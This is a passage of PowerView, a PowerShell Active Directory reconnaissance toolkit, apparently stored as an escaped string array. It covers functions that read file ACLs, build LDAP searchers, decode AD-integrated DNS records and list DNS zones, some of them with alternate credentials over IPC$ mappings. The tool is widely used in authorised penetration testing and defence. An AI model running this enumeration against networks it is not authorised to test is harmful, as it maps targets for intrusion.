'ReadAttributes'","                [uint32]'0x00000040' = 'DeleteChild'","                [uint32]'0x00000020' = 'Execute/Traverse'","                [uint32]'0x00000010' = 'WriteExtendedAttributes'","                [uint32]'0x00000008' = 'ReadExtendedAttributes'","                [uint32]'0x00000004' = 'AppendData/AddSubdirectory'","                [uint32]'0x00000002' = 'WriteData/AddFile'","                [uint32]'0x00000001' = 'ReadData/ListDirectory'","            }","","            $SimplePermissions = @{","                [uint32]'0x1f01ff' = 'FullControl'","                [uint32]'0x0301bf' = 'Modify'","                [uint32]'0x0200a9' = 'ReadAndExecute'","                [uint32]'0x02019f' = 'ReadAndWrite'","                [uint32]'0x020089' = 'Read'","                [uint32]'0x000116' = 'Write'","            }","","            $Permissions = @()","","            # get simple permission","            $Permissions += $SimplePermissions.Keys | ForEach-Object {","                              if (($FSR -band $_) -eq $_) {","                                $SimplePermissions[$_]","                                $FSR = $FSR -band (-not $_)","                              }","                            }","","            # get remaining extended permissions","            $Permissions += $AccessMask.Keys | Where-Object { $FSR -band $_ } | ForEach-Object { $AccessMask[$_] }","            ($Permissions | Where-Object {$_}) -join ','","        }","","        $ConvertArguments = @{}","        if ($PSBoundParameters['Credential']) { $ConvertArguments['Credential'] = $Credential }","","        $MappedComputers = @{}","    }","","    PROCESS {","        ForEach ($TargetPath in $Path) {","            try {","                if (($TargetPath -Match '\\\\\\\\.*\\\\.*') -and ($PSBoundParameters['Credential'])) {","                    $HostComputer = (New-Object System.Uri($TargetPath)).Host","                    if (-not $MappedComputers[$HostComputer]) {","                        # map IPC$ to this computer if it's not already","                        Add-RemoteConnection -ComputerName $HostComputer -Credential $Credential","                        $MappedComputers[$HostComputer] = $True","                    }","                }","","                $ACL = Get-Acl -Path $TargetPath","","                $ACL.GetAccessRules($True, $True, [System.Security.Principal.SecurityIdentifier]) | ForEach-Object {","                    $SID = $_.IdentityReference.Value","                    $Name = ConvertFrom-SID -ObjectSID $SID @ConvertArguments","","                    $Out = New-Object PSObject","                    $Out | Add-Member Noteproperty 'Path' $TargetPath","                    $Out | Add-Member Noteproperty 'FileSystemRights' (Convert-FileRight -FSR $_.FileSystemRights.value__)","                    $Out | Add-Member Noteproperty 'IdentityReference' $Name","                    $Out | Add-Member Noteproperty 'IdentitySID' $SID","                    $Out | Add-Member Noteproperty 'AccessControlType' $_.AccessControlType","                    $Out.PSObject.TypeNames.Insert(0, 'PowerView.FileACL')","                    $Out","                }","            }","            catch {","                Write-Verbose \"[Get-PathAcl] error: $_\"","            }","        }","    }","","    END {","        # remove the IPC$ mappings","        $MappedComputers.Keys | Remove-RemoteConnection","    }","}","","","function Convert-LDAPProperty {","\u003c#",".SYNOPSIS","","Helper that converts specific LDAP property result fields and outputs","a custom psobject.","","Author: Will Schroeder (@harmj0y)  ","License: BSD 3-Clause  ","Required Dependencies: None  ","",".DESCRIPTION","","Converts a set of raw LDAP properties results from ADSI/LDAP searches","into a proper PSObject. Used by several of the Get-Domain* function.","",".PARAMETER Properties","","Properties object to extract out LDAP fields for display.","",".OUTPUTS","","System.Management.Automation.PSCustomObject","","A custom PSObject with LDAP hashtable properties translated.","#\u003e","","    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]","    [OutputType('System.Management.Automation.PSCustomObject')]","    [CmdletBinding()]","    Param(","        [Parameter(Mandatory = $True, ValueFromPipeline = $True)]","        [ValidateNotNullOrEmpty()]","        $Properties","    )","","    $ObjectProperties = @{}","","    $Properties.PropertyNames | ForEach-Object {","        if ($_ -ne 'adspath') {","            if (($_ -eq 'objectsid') -or ($_ -eq 'sidhistory')) {","                # convert all listed sids (i.e. if multiple are listed in sidHistory)","                $ObjectProperties[$_] = $Properties[$_] | ForEach-Object { (New-Object System.Security.Principal.SecurityIdentifier($_, 0)).Value }","            }","            elseif ($_ -eq 'grouptype') {","                $ObjectProperties[$_] = $Properties[$_][0] -as $GroupTypeEnum","            }","            elseif ($_ -eq 'samaccounttype') {","                $ObjectProperties[$_] = $Properties[$_][0] -as $SamAccountTypeEnum","            }","            elseif ($_ -eq 'objectguid') {","                # convert the GUID to a string","                $ObjectProperties[$_] = (New-Object Guid (,$Properties[$_][0])).Guid","            }","            elseif ($_ -eq 'useraccountcontrol') {","                $ObjectProperties[$_] = $Properties[$_][0] -as $UACEnum","            }","            elseif ($_ -eq 'ntsecuritydescriptor') {","                # $ObjectProperties[$_] = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $Properties[$_][0], 0","                $Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $Properties[$_][0], 0","                if ($Descriptor.Owner) {","                    $ObjectProperties['Owner'] = $Descriptor.Owner","                }","                if ($Descriptor.Group) {","                    $ObjectProperties['Group'] = $Descriptor.Group","                }","                if ($Descriptor.DiscretionaryAcl) {","                    $ObjectProperties['DiscretionaryAcl'] = $Descriptor.DiscretionaryAcl","                }","                if ($Descriptor.SystemAcl) {","                    $ObjectProperties['SystemAcl'] = $Descriptor.SystemAcl","                }","            }","            elseif ($_ -eq 'accountexpires') {","                if ($Properties[$_][0] -gt [DateTime]::MaxValue.Ticks) {","                    $ObjectProperties[$_] = \"NEVER\"","                }","                else {","                    $ObjectProperties[$_] = [datetime]::fromfiletime($Properties[$_][0])","                }","            }","            elseif ( ($_ -eq 'lastlogon') -or ($_ -eq 'lastlogontimestamp') -or ($_ -eq 'pwdlastset') -or ($_ -eq 'lastlogoff') -or ($_ -eq 'badPasswordTime') ) {","                # convert timestamps","                if ($Properties[$_][0] -is [System.MarshalByRefObject]) {","                    # if we have a System.__ComObject","                    $Temp = $Properties[$_][0]","                    [Int32]$High = $Temp.GetType().InvokeMember('HighPart', [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)","                    [Int32]$Low  = $Temp.GetType().InvokeMember('LowPart',  [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)","                    $ObjectProperties[$_] = ([datetime]::FromFileTime([Int64](\"0x{0:x8}{1:x8}\" -f $High, $Low)))","                }","                else {","                    # otherwise just a string","                    $ObjectProperties[$_] = ([datetime]::FromFileTime(($Properties[$_][0])))","                }","            }","            elseif ($Properties[$_][0] -is [System.MarshalByRefObject]) {","                # try to convert misc com objects","                $Prop = $Properties[$_]","                try {","                    $Temp = $Prop[$_][0]","                    [Int32]$High = $Temp.GetType().InvokeMember('HighPart', [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)","                    [Int32]$Low  = $Temp.GetType().InvokeMember('LowPart',  [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)","                    $ObjectProperties[$_] = [Int64](\"0x{0:x8}{1:x8}\" -f $High, $Low)","                }","                catch {","                    Write-Verbose \"[Convert-LDAPProperty] error: $_\"","                    $ObjectProperties[$_] = $Prop[$_]","                }","            }","            elseif ($Properties[$_].count -eq 1) {","                $ObjectProperties[$_] = $Properties[$_][0]","            }","            else {","                $ObjectProperties[$_] = $Properties[$_]","            }","        }","    }","    try {","        New-Object -TypeName PSObject -Property $ObjectProperties","    }","    catch {","        Write-Warning \"[Convert-LDAPProperty] Error parsing LDAP properties : $_\"","    }","}","","","########################################################","#","# Domain info functions below.","#","########################################################","","function Get-DomainSearcher {","\u003c#",".SYNOPSIS","","Helper used by various functions that builds a custom AD searcher object.","","Author: Will Schroeder (@harmj0y)  ","License: BSD 3-Clause  ","Required Dependencies: Get-Domain  ","",".DESCRIPTION","","Takes a given domain and a number of customizations and returns a","System.DirectoryServices.DirectorySearcher object. This function is used","heavily by other LDAP/ADSI searcher functions (Verb-Domain*).","",".PARAMETER Domain","","Specifies the domain to use for the query, defaults to the current domain.","",".PARAMETER LDAPFilter","","Specifies an LDAP query string that is used to filter Active Directory objects.","",".PARAMETER Properties","","Specifies the properties of the output object to retrieve from the server.","",".PARAMETER SearchBase","","The LDAP source to search through, e.g. \"LDAP://OU=secret,DC=testlab,DC=local\"","Useful for OU queries.","",".PARAMETER SearchBasePrefix","","Specifies a prefix for the LDAP search string (i.e. \"CN=Sites,CN=Configuration\").","",".PARAMETER Server","","Specifies an Active Directory server (domain controller) to bind to for the search.","",".PARAMETER SearchScope","","Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).","",".PARAMETER ResultPageSize","","Specifies the PageSize to set for the LDAP searcher object.","",".PARAMETER ResultPageSize","","Specifies the PageSize to set for the LDAP searcher object.","",".PARAMETER ServerTimeLimit","","Specifies the maximum amount of time the server spends searching. Default of 120 seconds.","",".PARAMETER SecurityMasks","","Specifies an option for examining security information of a directory object.","One of 'Dacl', 'Group', 'None', 'Owner', 'Sacl'.","",".PARAMETER Tombstone","","Switch. Specifies that the searcher should also return deleted/tombstoned objects.","",".PARAMETER Credential","","A [Management.Automation.PSCredential] object of alternate credentials","for connection to the target domain.","",".EXAMPLE","","Get-DomainSearcher -Domain testlab.local","","Return a searcher for all objects in testlab.local.","",".EXAMPLE","","Get-DomainSearcher -Domain testlab.local -LDAPFilter '(samAccountType=805306368)' -Properties 'SamAccountName,lastlogon'","","Return a searcher for user objects in testlab.local and only return the SamAccountName and LastLogon properties.","",".EXAMPLE","","Get-DomainSearcher -SearchBase \"LDAP://OU=secret,DC=testlab,DC=local\"","","Return a searcher that searches through the specific ADS/LDAP search base (i.e. OU).","",".OUTPUTS","","System.DirectoryServices.DirectorySearcher","#\u003e","","    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]","    [OutputType('System.DirectoryServices.DirectorySearcher')]","    [CmdletBinding()]","    Param(","        [Parameter(ValueFromPipeline = $True)]","        [ValidateNotNullOrEmpty()]","        [String]","        $Domain,","","        [ValidateNotNullOrEmpty()]","        [Alias('Filter')]","        [String]","        $LDAPFilter,","","        [ValidateNotNullOrEmpty()]","        [String[]]","        $Properties,","","        [ValidateNotNullOrEmpty()]","        [Alias('ADSPath')]","        [String]","        $SearchBase,","","        [ValidateNotNullOrEmpty()]","        [String]","        $SearchBasePrefix,","","        [ValidateNotNullOrEmpty()]","        [Alias('DomainController')]","        [String]","        $Server,","","        [ValidateSet('Base', 'OneLevel', 'Subtree')]","        [String]","        $SearchScope = 'Subtree',","","        [ValidateRange(1, 10000)]","        [Int]","        $ResultPageSize = 200,","","        [ValidateRange(1, 10000)]","        [Int]","        $ServerTimeLimit = 120,","","        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]","        [String]","        $SecurityMasks,","","        [Switch]","        $Tombstone,","","        [Management.Automation.PSCredential]","        [Management.Automation.CredentialAttribute()]","        $Credential = [Management.Automation.PSCredential]::Empty","    )","","    PROCESS {","        if ($PSBoundParameters['Domain']) {","            $TargetDomain = $Domain","","            if ($ENV:USERDNSDOMAIN -and ($ENV:USERDNSDOMAIN.Trim() -ne '')) {","                # see if we can grab the user DNS logon domain from environment variables","                $UserDomain = $ENV:USERDNSDOMAIN","                if ($ENV:LOGONSERVER -and ($ENV:LOGONSERVER.Trim() -ne '') -and $UserDomain) {","                    $BindServer = \"$($ENV:LOGONSERVER -replace '\\\\','').$UserDomain\"","                }","            }","        }","        elseif ($PSBoundParameters['Credential']) {","            # if not -Domain is specified, but -Credential is, try to retrieve the current domain name with Get-Domain","            $DomainObject = Get-Domain -Credential $Credential","            $BindServer = ($DomainObject.PdcRoleOwner).Name","            $TargetDomain = $DomainObject.Name","        }","        elseif ($ENV:USERDNSDOMAIN -and ($ENV:USERDNSDOMAIN.Trim() -ne '')) {","            # see if we can grab the user DNS logon domain from environment variables","            $TargetDomain = $ENV:USERDNSDOMAIN","            if ($ENV:LOGONSERVER -and ($ENV:LOGONSERVER.Trim() -ne '') -and $TargetDomain) {","                $BindServer = \"$($ENV:LOGONSERVER -replace '\\\\','').$TargetDomain\"","            }","        }","        else {","            # otherwise, resort to Get-Domain to retrieve the current domain object","            write-verbose \"get-domain\"","            $DomainObject = Get-Domain","            $BindServer = ($DomainObject.PdcRoleOwner).Name","            $TargetDomain = $DomainObject.Name","        }","","        if ($PSBoundParameters['Server']) {","            # if there's not a specified server to bind to, try to pull a logon server from ENV variables","            $BindServer = $Server","        }","","        $SearchString = 'LDAP://'","","        if ($BindServer -and ($BindServer.Trim() -ne '')) {","            $SearchString += $BindServer","            if ($TargetDomain) {","                $SearchString += '/'","            }","        }","","        if ($PSBoundParameters['SearchBasePrefix']) {","            $SearchString += $SearchBasePrefix + ','","        }","","        if ($PSBoundParameters['SearchBase']) {","            if ($SearchBase -Match '^GC://') {","                # if we're searching the global catalog, get the path in the right format","                $DN = $SearchBase.ToUpper().Trim('/')","                $SearchString = ''","            }","            else {","                if ($SearchBase -match '^LDAP://') {","                    if ($SearchBase -match \"LDAP://.+/.+\") {","                        $SearchString = ''","                        $DN = $SearchBase","                    }","                    else {","                        $DN = $SearchBase.SubString(7)","                    }","                }","                else {","                    $DN = $SearchBase","                }","            }","        }","        else {","            # transform the target domain name into a distinguishedName if an ADS search base is not specified","            if ($TargetDomain -and ($TargetDomain.Trim() -ne '')) {","                $DN = \"DC=$($TargetDomain.Replace('.', ',DC='))\"","            }","        }","","        $SearchString += $DN","        Write-Verbose \"[Get-DomainSearcher] search base: $SearchString\"","","        if ($Credential -ne [Management.Automation.PSCredential]::Empty) {","            Write-Verbose \"[Get-DomainSearcher] Using alternate credentials for LDAP connection\"","            # bind to the inital search object using alternate credentials","            $DomainObject = New-Object DirectoryServices.DirectoryEntry($SearchString, $Credential.UserName, $Credential.GetNetworkCredential().Password)","            $Searcher = New-Object System.DirectoryServices.DirectorySearcher($DomainObject)","        }","        else {","            # bind to the inital object using the current credentials","            $Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)","        }","","        $Searcher.PageSize = $ResultPageSize","        $Searcher.SearchScope = $SearchScope","        $Searcher.CacheResults = $False","        $Searcher.ReferralChasing = [System.DirectoryServices.ReferralChasingOption]::All","","        if ($PSBoundParameters['ServerTimeLimit']) {","            $Searcher.ServerTimeLimit = $ServerTimeLimit","        }","","        if ($PSBoundParameters['Tombstone']) {","            $Searcher.Tombstone = $True","        }","","        if ($PSBoundParameters['LDAPFilter']) {","            $Searcher.filter = $LDAPFilter","        }","","        if ($PSBoundParameters['SecurityMasks']) {","            $Searcher.SecurityMasks = Switch ($SecurityMasks) {","                'Dacl' { [System.DirectoryServices.SecurityMasks]::Dacl }","                'Group' { [System.DirectoryServices.SecurityMasks]::Group }","                'None' { [System.DirectoryServices.SecurityMasks]::None }","                'Owner' { [System.DirectoryServices.SecurityMasks]::Owner }","                'Sacl' { [System.DirectoryServices.SecurityMasks]::Sacl }","            }","        }","","        if ($PSBoundParameters['Properties']) {","            # handle an array of properties to load w/ the possibility of comma-separated strings","            $PropertiesToLoad = $Properties| ForEach-Object { $_.Split(',') }","            $Null = $Searcher.PropertiesToLoad.AddRange(($PropertiesToLoad))","        }","","        $Searcher","    }","}","","","function Convert-DNSRecord {","\u003c#",".SYNOPSIS","","Helpers that decodes a binary DNS record blob.","","Author: Michael B. Smith, Will Schroeder (@harmj0y)  ","License: BSD 3-Clause  ","Required Dependencies: None  ","",".DESCRIPTION","","Decodes a binary blob representing an Active Directory DNS entry.","Used by Get-DomainDNSRecord.","","Adapted/ported from Michael B. Smith's code at https://raw.githubusercontent.com/mmessano/PowerShell/master/dns-dump.ps1","",".PARAMETER DNSRecord","","A byte array representing the DNS record.","",".OUTPUTS","","System.Management.Automation.PSCustomObject","","Outputs custom PSObjects with detailed information about the DNS record entry.","",".LINK","","https://raw.githubusercontent.com/mmessano/PowerShell/master/dns-dump.ps1","#\u003e","","    [OutputType('System.Management.Automation.PSCustomObject')]","    [CmdletBinding()]","    Param(","        [Parameter(Position = 0, Mandatory = $True, ValueFromPipelineByPropertyName = $True)]","        [Byte[]]","        $DNSRecord","    )","","    BEGIN {","        function Get-Name {","            [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseOutputTypeCorrectly', '')]","            [CmdletBinding()]","            Param(","                [Byte[]]","                $Raw","            )","","            [Int]$Length = $Raw[0]","            [Int]$Segments = $Raw[1]","            [Int]$Index =  2","            [String]$Name  = ''","","            while ($Segments-- -gt 0)","            {","                [Int]$SegmentLength = $Raw[$Index++]","                while ($SegmentLength-- -gt 0) {","                    $Name += [Char]$Raw[$Index++]","                }","                $Name += \".\"","            }","            $Name","        }","    }","","    PROCESS {","        # $RDataLen = [BitConverter]::ToUInt16($DNSRecord, 0)","        $RDataType = [BitConverter]::ToUInt16($DNSRecord, 2)","        $UpdatedAtSerial = [BitConverter]::ToUInt32($DNSRecord, 8)","","        $TTLRaw = $DNSRecord[12..15]","","        # reverse for big endian","        $Null = [array]::Reverse($TTLRaw)","        $TTL = [BitConverter]::ToUInt32($TTLRaw, 0)","","        $Age = [BitConverter]::ToUInt32($DNSRecord, 20)","        if ($Age -ne 0) {","            $TimeStamp = ((Get-Date -Year 1601 -Month 1 -Day 1 -Hour 0 -Minute 0 -Second 0).AddHours($age)).ToString()","        }","        else {","            $TimeStamp = '[static]'","        }","","        $DNSRecordObject = New-Object PSObject","","        if ($RDataType -eq 1) {","            $IP = \"{0}.{1}.{2}.{3}\" -f $DNSRecord[24], $DNSRecord[25], $DNSRecord[26], $DNSRecord[27]","            $Data = $IP","            $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'A'","        }","","        elseif ($RDataType -eq 2) {","            $NSName = Get-Name $DNSRecord[24..$DNSRecord.length]","            $Data = $NSName","            $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'NS'","        }","","        elseif ($RDataType -eq 5) {","            $Alias = Get-Name $DNSRecord[24..$DNSRecord.length]","            $Data = $Alias","            $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'CNAME'","        }","","        elseif ($RDataType -eq 6) {","            # TODO: how to implement properly? nested object?","            $Data = $([System.Convert]::ToBase64String($DNSRecord[24..$DNSRecord.length]))","            $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'SOA'","        }","","        elseif ($RDataType -eq 12) {","            $Ptr = Get-Name $DNSRecord[24..$DNSRecord.length]","            $Data = $Ptr","            $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'PTR'","        }","","        elseif ($RDataType -eq 13) {","            # TODO: how to implement properly? nested object?","            $Data = $([System.Convert]::ToBase64String($DNSRecord[24..$DNSRecord.length]))","            $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'HINFO'","        }","","        elseif ($RDataType -eq 15) {","            # TODO: how to implement properly? nested object?","            $Data = $([System.Convert]::ToBase64String($DNSRecord[24..$DNSRecord.length]))","            $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'MX'","        }","","        elseif ($RDataType -eq 16) {","            [string]$TXT  = ''","            [int]$SegmentLength = $DNSRecord[24]","            $Index = 25","","            while ($SegmentLength-- -gt 0) {","                $TXT += [char]$DNSRecord[$index++]","            }","","            $Data = $TXT","            $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'TXT'","        }","","        elseif ($RDataType -eq 28) {","            # TODO: how to implement properly? nested object?","            $Data = $([System.Convert]::ToBase64String($DNSRecord[24..$DNSRecord.length]))","            $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'AAAA'","        }","","        elseif ($RDataType -eq 33) {","            # TODO: how to implement properly? nested object?","            $Data = $([System.Convert]::ToBase64String($DNSRecord[24..$DNSRecord.length]))","            $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'SRV'","        }","","        else {","            $Data = $([System.Convert]::ToBase64String($DNSRecord[24..$DNSRecord.length]))","            $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'UNKNOWN'","        }","","        $DNSRecordObject | Add-Member Noteproperty 'UpdatedAtSerial' $UpdatedAtSerial","        $DNSRecordObject | Add-Member Noteproperty 'TTL' $TTL","        $DNSRecordObject | Add-Member Noteproperty 'Age' $Age","        $DNSRecordObject | Add-Member Noteproperty 'TimeStamp' $TimeStamp","        $DNSRecordObject | Add-Member Noteproperty 'Data' $Data","        $DNSRecordObject","    }","}","","","function Get-DomainDNSZone {","\u003c#",".SYNOPSIS","","Enumerates the Active Directory DNS zones for a given domain.","","Author: Will Schroeder (@harmj0y)  ","License: BSD 3-Clause  ","Required Dependencies: Get-DomainSearcher, Convert-LDAPProperty  ","",".PARAMETER Domain","","The domain to query for zones, defaults to the current domain.","",".PARAMETER Server","","Specifies an Active Directory server (domain controller) to bind to for the search.","",".PARAMETER Properties","","Specifies the properties of the output object to retrieve from the server.","",".PARAMETER ResultPageSize","","Specifies the PageSize to set for the LDAP searcher object.","",".PARAMETER ServerTimeLimit","","Specifies the maximum amount of time the server spends searching. Default of 120 seconds.","",".PARAMETER FindOne","","Only return one result object.","",".PARAMETER Credential","","A [Management.Automation.PSCredential] object of alternate credentials","for connection to the target domain.","",".EXAMPLE","","Get-DomainDNSZone","","Retrieves the DNS zones for the current domain.","",".EXAMPLE","","Get-DomainDNSZone -Domain dev.testlab.local -Server primary.testlab.local","","Retrieves the DNS zones for the dev.testlab.local domain, binding to primary.testlab.local.","",".OUTPUTS","","PowerView.DNSZone","","Outputs custom PSObjects with detailed information about the DNS zone.","#\u003e","","    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]","    [OutputType('PowerView.DNSZone')]","    [CmdletBinding()]","    Param(","        [Parameter(Position = 0, ValueFromPipeline = $True)]","        [ValidateNotNullOrEmpty()]","        [String]","        $Domain,","","        [ValidateNotNullOrEmpty()]","        [Alias('DomainController')]","        [String]","        $Server,","","        [ValidateNotNullOrEmpty()]","        [String[]]","        $Properties,","","        [ValidateRange(1, 10000)]","        [Int]","        $ResultPageSize = 200,","","        [ValidateRange(1, 10000)]","        [Int]","        $ServerTimeLimit,","","        [Alias('ReturnOne')]","        [Switch]","        $FindOne,","","        [Management.Automation.PSCredential]","        [Management.Automation.CredentialAttribute()]","        $Credential = [Management.Automation.PSCredential]::Empty","    )","","    PROCESS {","        $SearcherArguments = @{","            'LDAPFilter' = '(objectClass=dnsZone)'","        }","        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }","        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }","        if ($PSBoundParameters['Properties']) { $SearcherArguments['Properties'] = $Properties }","        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }","        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }","        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }","        $DNSSearcher1 = Get-DomainSearcher @SearcherArguments","","        if ($DNSSearcher1) {","            if ($PSBoundParameters['FindOne']) { $Results = $DNSSearcher1.FindOne()  }","            else { $Results = $DNSSearcher1.FindAll() }","            $Results | Where-Object {$_} | ForEach-Object {","                $Out = Convert-LDAPProperty -Properties $_.Properties","                $Out | Add-Member NoteProperty 'ZoneName' $Out.name","                $Out.PSObject.TypeNames.Insert(0, 'PowerView.DNSZone')","                $Out","            }","","            if ($Results) {","                try { $Results.dispose() }","                catch {","                    Write-Verbose \"[Get-DomainDFSShare] Error disposing of the Results object: $_\"","                }","            }","            $DNSSearcher1.dispose()","        }","","        $SearcherArguments['SearchBasePrefix'] = 'CN=MicrosoftDNS,DC=DomainDnsZones'","        $DNSSearcher2 = Get-DomainSearcher @SearcherArguments","","        if ($DNSSearcher2) {","            try {","                if ($PSBoundParameters['FindOne']) { $Results = $DNSSearcher2.FindOne() }","                else { $Results = $DNSSearcher2.FindAll() }","                $Results | Where-Object {$_} | ForEach-Object {","                    $Out = Convert-LDAPProperty -Properties $_.Properties","                    $Out | Add-Member NoteProperty 'ZoneName' $Out.name","                    $Out.PSObject.TypeNames.Insert(0, 'PowerView.DNSZone')","                    $Out","                }","                if ($Results) {","                    try { $Results.dispose() }","                    catch {","                        Write-Verbose \"[Get-DomainDNSZone] Error disposing of the Results object: $_\"","                    }","                }","            }","            catch {","                Write-Verbose \"[Get-DomainDNSZone] Error accessing 'CN=MicrosoftDNS,DC=DomainDnsZones'\"","            }","            $DNSSearcher2.dispose()","        }","    }","}","","","function Get-DomainDNSRecord {","\u003c#",".SYNOPSIS","","Enumerates the Active Directory DNS records for a given zone.","","Author: Will Schroeder (@harmj0y)  ","License: BSD 3-Clause  ","Required Dependencies: Get-DomainSearcher, Convert-LDAPProperty, Convert-DNSRecord  ","",".DESCRIPTION","","Given a specific Active Directory DNS zone name, query for all 'dnsNode'","LDAP entries using that zone as the search base. Return all DNS entry results","and use Convert-DNSRecord to try to convert the binary DNS record blobs.","",".PARAMETER ZoneName","","Specifies the zone to query for records (which can be enumearted with Get-DomainDNSZone).","",".PARAMETER Domain","","The domain to query for zones, defaults to the current domain.","",".PARAMETER Server","","Specifies an Active Directory server (domain controller) to bind to for the search.","",".PARAMETER Properties","","Specifies the properties of the output object to retrieve from the server.","",".PARAMETER ResultPageSize","","Specifies the PageSize to set for the LDAP searcher object.","",".PARAMETER ServerTimeLimit","","Specifies the maximum amount of time the server spends searching. Default of 120 seconds.","",".PARAMETER FindOne","","Only return one result object.","",".PARAMETER Credential","","A [Management.Automation.PSCredential] object of alternate credentials","for connection to the target domain.","",".EXAMPLE","","Get-DomainDNSRecord -ZoneName testlab.local","","Retrieve all records for the testlab.local zone.","",".EXAMPLE","","Get-DomainDNSZone | Get-DomainDNSRecord","","Retrieve all records for all zones in the current domain.","",".EXAMPLE","","Get-DomainDNSZone -Domain dev.testlab.local | Get-DomainDNSRecord -Domain dev.testlab.local","","Retrieve all records for all zones in the dev.testlab.local domain.","",".OUTPUTS","","PowerView.DNSRecord","","Outputs custom PSObjects with detailed information about the DNS record entry.","#\u003e","","    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]","    [OutputType('PowerView.DNSRecord')]","    [CmdletBinding()]","    Param(","        [Parameter(Position = 0,  Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]","        [ValidateNotNullOrEmpty()]","        [String]","        $ZoneName,","","        [ValidateNotNullOrEmpty()]","        [String]","        $Domain,","","        [ValidateNotNullOrEmpty()]","        [Alias('DomainController')]","        [String]","        $Server,","","        [ValidateNotNullOrEmpty()]","        [String[]]","        $Properties = 'name,distinguishedname,dnsrecord,whencreated,whenchanged',","","        [ValidateRange(1, 10000)]","        [Int]","        $ResultPageSize = 200,","","        [ValidateRange(1, 10000)]","        [Int]","        $ServerTimeLimit,","","        [Alias('ReturnOne')]","        [Switch]","        $FindOne,","","        [Management.Automation.PSCredential]","        [Management.Automation.CredentialAttribute()]","        $Credential = [Management.Automation.PSCredential]::Empty","    )","","    PROCESS {","        $SearcherArguments = @{","            'LDAPFilter' = '(objectClass=dnsNode)'","            'SearchBasePrefix' = \"DC=$($ZoneName),CN=MicrosoftDNS,DC=DomainDnsZones\"","        }","        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }","        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }","        if ($PSBoundParameters['Properties']) { $SearcherArguments['Properties'] = $Properties }","        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }","        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }","        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }","        $DNSSearcher = Get-DomainSearcher @SearcherArguments","","        if ($DNSSearcher) {","            if ($PSBoundParameters['FindOne']) { $Results = $DNSSearcher.FindOne() }","            else { $Results = $DNSSearcher.FindAll() }","            $Results | Where-Object {$_} | ForEach-Object {","                try {","                    $Out = Convert-LDAPProperty -Properties $_.Properties | Select-Object name,distinguishedname,dnsrecord,whencreated,whenchanged","                    $Out | Add-Member NoteProperty 'ZoneName' $ZoneName","","                    # convert the record and extract the properties","                    if ($Out.dnsrecord -is [System.DirectoryServices.ResultPropertyValueCollection]) {","                        # TODO: handle multiple nested records properly?","                        $Record = Convert-DNSRecord -DNSRecord $Out.dnsrecord[0]","                    }","                    else {","                        $Record = Convert-DNSRecord -DNSRecord $Out.dnsrecord","                    }","","                    if ($Record) {","                        $Record.PSObject.Properties | ForEach-Object {","                            $Out | Add-Member NoteProperty $_.Name $_.Value","                        }","                    }","","                    $Out.PSObject.TypeNames.Insert(0, 'PowerView.DNSRecord')","                    $Out","                }","                catch {","                    Write-Warning \"[Get-DomainDNSRecord] Error: $_\"","                    $Out","                }","            }","","            if ($Results) {","                try { $Results.dispose() }","                catch {","                    Write-Verbose \"[Get-DomainDNSRecord] Error disposing of the Results object: $_\"","                }","            }","            $DNSSearcher.dispose()","        }","    }","}","","","function Get-Domain {","\u003c#",".SYNOPSIS","","Returns the domain object for the current (or specified) domain.","","Author: Will Schroeder (@harmj0y)  ","License: BSD 3-Clause  ","Required Dependencies: None  ","",".DESCRIPTION","","Returns a System.DirectoryServices.ActiveDirectory.Domain object for the current","domain or the domain specified with -Domain X.","",".PARAMETER Domain","","Specifies the domain name to query for, defaults to the current domain.","",".PARAMETER Credential","","A [Management.Automation.PSCredential] object of alternate credentials","for connection to the target domain.","",".EXAMPLE","","Get-Domain -Domain testlab.local","",".EXAMPLE","","$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force","$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)","Get-Domain -Credential $Cred","",".OUTPUTS","","System.DirectoryServices.ActiveDirectory.Domain","","A complex .NET domain object.","",".LINK","","http://social.technet.microsoft.com/Forums/scriptcenter/en-US/0c5b3f83-e528-4d49-92a4-dee31f4b481c/finding-the-dn-of-the-the-domain-without-admodule-in-powershell?forum=ITCG","#\u003e","","    [OutputType([System.DirectoryServices.ActiveDirectory.Domain])]","    [CmdletBinding()]","    Param(","    